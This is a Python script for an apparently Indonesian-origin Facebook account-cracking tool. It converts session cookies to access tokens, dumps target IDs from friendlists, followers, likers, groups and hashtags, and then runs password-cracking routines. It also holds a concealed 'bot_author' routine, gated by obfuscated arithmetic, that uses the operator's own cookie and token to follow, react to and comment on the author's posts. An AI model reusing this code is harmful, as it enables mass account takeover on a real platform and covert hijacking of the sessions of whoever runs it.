###----------[ AUTHOR & CREATOR ]---------- ###
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = '0.6'
Denventa  = 1827084332
Postingan = 10217173381366429

###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ PROXY INDONESIA & LUAR ]---------- ###
def prox_prox():
    open('tool/proxy.json','w').write('')
    with requests.Session() as xyz:
        try:
            req = xyz.get('https://spys.me/socks.txt').text
            for x in req.splitlines():
                if '+' in x:
                    if '.' in x:
                        prox = x.split(' ')[0]
                        open('tool/proxy.json','a+').write('%s\n'%(prox))
        except Exception as e:
            prox = '123.45.678.90:4509'
            open('tool/proxy.json','a+').write('%s\n'%(prox))

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass
#-----------[APPROVAL]--------------------#
def xoshnaw(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid) 
  print("\x1b[1;92m╚═➣ YOUR ID\x1b[1;91m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/44D4RSH4DON/aprove/blob/main/Aproval.txt").text 
    if id in httpCaht: 
      print("\x1b[1;96m╚═➣ STATUS: PREMIUM\033[1;92m[✔]") 
      msg = str(os.geteuid()) 
      time.sleep(3) 
      pass 
    else: 
      print("\x1b[38;5;248m╚═➣ ID NOT REGISTERED \x1b[1;91m[✘]") 
      print("\x1b[38;5;208mCOPY AND SEND KEY TO OENER !!!") 
      os.system('xdg-open https://www.facebook.com/PR3SH4KBAUF33LTH3POW3R') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     xoshnaw() 
xoshnaw()
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %s There is an error %s!%s'%(M,P,M,P,M,P))
    print('       %s• %s Cannot Execute %s\n'%(M,A,error))
    print('   %s[%s•%s] %s This Might Happen Because %s:%s'%(M,P,M,P,M,P))
    print('       %s• %sCookies/Token Invalid'%(M,A))
    print('       %s• %s Wrong ID Entering'%(M,A))
    print('       %s• %s Bugs in the source code'%(M,A))
    print('       %s• %s Bugs On Requests'%(M,A))
    print('       %s• %s And others\n'%(M,A))
    print('   %s[%s•%s] %s Rerun This Source Code %s:%s'%(M,P,M,P,M,P))
    print('       %s• %spython Vip.py\n'%(M,A))
    exit()

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Sunday','Monday':'Monday','Tuesday':'Tuesday','Wednesday':'Wednesday','Thursday':'Thursday','Friday':'Friday','Saturday ':'Saturday'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return(re.search('(\["EAAG\w+)', get_tok.text).group(1).replace('["',''))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    print("""
 ____  ____  ____  ____  ____  ____  _     ____   
/  _ \/  _ \/  _ \/  _ \/  __\/ ___\/ \ /|/  _ \  
| / \|| / \|| | \|| / \||  \/||    \| |_||| / \|  
| |-||| |-||| |_/|| |-|||    /\___ || | ||| |-||  
\_/ \|\_/ \|\____/\_/ \|\_/\_\\____/\_/ \|\_/ \|  

[+] USE THIS TOOL FOR EDUCATIONAL PURPOSE ONLY 
[+] HACKING IS ILLEGAL IN ALL NATION
[+] INDO CODER SARAH RECODE WITH UPDATED HEADERS """)
                                                     
def poster2():
    print("""
 ____  ____  ____  ____  ____  ____  _     ____   
/  _ \/  _ \/  _ \/  _ \/  __\/ ___\/ \ /|/  _ \  
| / \|| / \|| | \|| / \||  \/||    \| |_||| / \|  
| |-||| |-||| |_/|| |-|||    /\___ || | ||| |-||  
\_/ \|\_/ \|\____/\_/ \|\_/\_\\____/\_/ \|\_/ \|  

[+] USE THIS TOOL FOR EDUCATIONAL PURPOSE ONLY 
[+] HACKING IS ILLEGAL IN ALL NATION
[+] INDO CODER SARAH RECODE WITH UPDATED HEADERS """)
def poster3():
    print("""
 ____  ____  ____  ____  ____  ____  _     ____   
/  _ \/  _ \/  _ \/  _ \/  __\/ ___\/ \ /|/  _ \  
| / \|| / \|| | \|| / \||  \/||    \| |_||| / \|  
| |-||| |-||| |_/|| |-|||    /\___ || | ||| |-||  
\_/ \|\_/ \|\____/\_/ \|\_/\_\\____/\_/ \|\_/ \|  

[[+] USE THIS TOOL FOR EDUCATIONAL PURPOSE ONLY 
[+] HACKING IS ILLEGAL IN ALL NATION
[+] INDO CODER SARAH RECODE WITH UPDATED HEADERS """)
                                                     

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Pass
    try:os.mkdir("tool")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory License
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass

###----------[ LOGIN ]---------- ###
def login():
    resik()
    mkdir_data_login()
    poster()
    print('\n%s[%s•%s] %s Dont Use Personal Account %s!'%(M,P,M,P,M))
    print('%s[%s•%s] %s If the A2F Account is On, Open the Link Below'%(M,P,M,P))
    print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,J))
    print('%s[%s•%s] %s Then Enter the Authentication Code'%(M,P,M,P))
    cookie = str(input('\n%s[%s•%s] %sEnter Cookies %s: %s'%(J,P,J,P,J,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        prox_prox()
        bot_author(coki,token,cookie)
        open('login/cookie.json','w').write(cookie)
        open('login/token.json','w').write(token)
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sNO INTERNET%s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ MENU ]---------- ###
def user(nama):
    print(''%())
    print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
def tampilan_menu():
    global gabung_sandi, tempel_sandi
    resik()
    gabung_sandi, tempel_sandi = [], []
    try:open('tool/useragent.json','r').read()
    except Exception as ERROR:
        resik()
        poster2()
        print('')
        tamp_new = (f'   {P2}NAMASTE EVERYONE ITS ME PRESHAK FROM NEPAL HOPE YOU ARE ENJOYING YOUR TIME ON MY COMMAND PLEASE SELECT CORRECT UA OF YOUR DEVICE\n\n                {H2}- Denventa -')
        printer(Panel(tamp_new,title=f'{H2}[ {P2}Welcome User {H2}]',width=54,padding=(1,4),style='#00FF00'))
        print('')
        useragent('new')
    poster()
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx["name"]
        user(nama)
        print(''%())
        tampilan_menu = f"""  {J2}[{A2}01{J2}] {P2}Friendlist {J2}[{A2}06{J2}] {P2}Comment   {J2}[{A2}11{J2}] {A2}Email
  {J2}[{A2}02{J2}] {P2}Followers  {J2}[{A2}07{J2}] {P2}Group     {J2}[{A2}12{J2}] {A2}Username
  {J2}[{A2}03{J2}] {P2}Name       {J2}[{A2}08{J2}] {P2}Hashtag   {J2}[{A2}13{J2}] {A2}ID Random
  {J2}[{A2}04{J2}] {P2}Likers     {J2}[{A2}09{J2}] {A2}Home page {J2}[{A2}14{J2}] {P2}Suggestion
  {J2}[{A2}05{J2}] {P2}Message    {J2}[{A2}10{J2}] {A2}File      {J2}[{A2}15{J2}] {P2}FILE&CRACK

       {J2}[{A2}16{J2}] {A2}Check Results      {J2}[{A2}19{J2}] {P2}User Agent
       {J2}[{A2}17{J2}] {A2}Check Options      {J2}[{A2}20{J2}] {A2}Upgrade Pro
       {J2}[{A2}18{J2}] {A2}Check Friend       {J2}[{A2}00{J2}] {P2}Log Out"""
        printer(Panel(tampilan_menu,title=f'{J2}[ {P2}OPTIONS IN WHITE ARE WORKING 🇳🇵♥️ {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}INPUT {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
def pilih_menu():
    global gabung_sandi, tempel_sandi
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');namee()
    elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');message();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['7','07','g']  : gabung_sandi.append('Mampus');grup()
    elif dc in ['8','08','h']  : tempel_sandi.append('Error Kan');hashtag();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['9','09','i']  : gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
    elif dc in ['10','010','j']: tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
    elif dc in ['11','011','k']: gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
    elif dc in ['12','012','l']: tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
    elif dc in ['13','013','m']: gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari ID Random')
    elif dc in ['14','014','n']: tempel_sandi.append('Btw');suggestion();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['15','015','o']: gabung_sandi.append('Elo');teman_teman()
    elif dc in ['16','016','p']: tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
    elif dc in ['17','017','q']: gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
    elif dc in ['18','018','r']: tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
    elif dc in ['19','019','s']: gabung_sandi.append('SC Ini');useragent('old')
    elif dc in ['20','020','t']: tempel_sandi.append('Hahaha');not_available('Upgrade Ke Versi Pro')
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
        tamp_logout1 = (f'   {P2}Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {B2}- Denventa -')
        tamp_logout2 = f'''{P2}Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :
    {B2}• {P2}Token/Cookies
    {B2}• {P2}File Dump
    {B2}• {P2}File Tools'''
        printer(Panel(tamp_logout1,title=f'{B2}[ {P2}Goodbye {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        print('')
        printer(Panel(tamp_logout2,title=f'{B2}[ {P2}Log Out {B2}]',width=54,padding=(1,4),style='#00C8FF'))
        input('\n               %s[ %sEnter To Logout %s]'%(B,P,B))
        try:shutil.rmtree('login')
        except:pass
        try:shutil.rmtree('dump')
        except:pass
        exit('\n\n')
    else:print('\n   %s[%s•%s] %s Correct Content %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ USER AGENT ]---------- ###
def useragent(isi):
    global pengguna_source_code
    pengguna_source_code = isi
    try:os.mkdir("tool")
    except:pass
    pilih_menu_user_agent()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:scrap_useragent()
    elif dc in ['2','02','b']:pilih_otomatis()
    elif dc in ['3','03','c']:manual_user_agent()
    elif dc in ['4','04','d']:ua_device_ini()
    elif dc in ['5','05','e']:cek_user_agent()
    elif dc in ['0','00','z']:tampilan_menu()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_menu_user_agent():
    tampilan_menu_user_agent = f'''  {J2}[{A2}01{J2}] {P2}Scrap UA Browser    {J2}[{A2}04{J2}] {P2}Find this UA HP
  {J2}[{A2}02{J2}] {P2}PROCEED TO TOOLS   {J2}[{A2}05{J2}] {P2}UA Check Used
  {J2}[{A2}03{J2}] {P2}Change UA Manual     {J2}[{A2}00{J2}] {P2}Exit'''
    printer(Panel(tampilan_menu_user_agent,title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}INPUT {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def pilih_device():
    tampilan_device = f'''   {J2}[{A2}01{J2}] {P2}Samsung    {J2}[{A2}05{J2}] {P2}Vivo      {J2}[{A2}09{J2}] {P2}Huawei
   {J2}[{A2}02{J2}] {P2}Nokia      {J2}[{A2}06{J2}] {P2}Iphone    {J2}[{A2}10{J2}] {P2}Windows
   {J2}[{A2}03{J2}] {P2}Xiaomi     {J2}[{A2}07{J2}] {P2}Asus      {J2}[{A2}11{J2}] {P2}Chrome
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB'''
    printer(Panel(tampilan_device,title=f'{J2}[ {P2}Device {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}INPUT {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def scrap_useragent():
    data_ua = {}
    pt = 0
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:     type = 'software_name/samsung-browser'
    elif dc in ['2','02','b']:   type = 'software_name/nokia-browser'
    elif dc in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
    elif dc in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
    elif dc in ['5','05','e']:   type = 'operating_platform_string/vivo'
    elif dc in ['6','06','f']:   type = 'operating_platform_string/apple'
    elif dc in ['7','07','g']:   type = 'operating_platform_string/asus'
    elif dc in ['8','08','h']:   type = 'operating_platform_string/lenovo'
    elif dc in ['9','09','i']:   type = 'operating_platform_string/huawei'
    elif dc in ['10','010','j']: type = 'operating_system_name/windows'
    elif dc in ['11','011','k']: type = 'operating_system_name/chrome-os'
    elif dc in ['12','012','l']: type = 'software_name/facebook-app'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    url = 'https://developers.whatismybrowser.com/useragents/explore/' + type
    with requests.Session() as xyz:
        req = xyz.get(url)
        pra = par(req.content,'html.parser')
        li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
        for y in li:
            try:
                x = f'{A2}'+y
                pt += 1
                pu = str(pt)
                data_ua.update({pu:x.replace('[#AAAAAA]','')})
                printer(Panel(x,title=f'{J2}[{P2}{pu}{J2}]',width=54,title_align='left',style='#FF8F00'))
                time.sleep(2)
            except KeyboardInterrupt:break
    ch = int(input('   %s└──> %s'%(A,J)))
    try:
        open('tool/useragent.json','w').write(data_ua[str(ch)])
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_otomatis():
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    try:
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def manual_user_agent():
    usera = input('       %s[%s•%s] %sMasukkan User Agent :\n%s'%(J,P,J,P,J))
    if usera in ['',' ','  ','   ']:print('\n       %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));manual_user_agent()
    else:open('tool/useragent.json','w').write(usera);cek_user_agent()
def ua_device_ini():
    url = 'https://www.google.com/search?q=my+user+agent'
    try:
        if "linux" in sys.platform.lower():chrome_path = '/usr/bin/google-chrome %s';webbrowser.get(chrome_path).open(url)
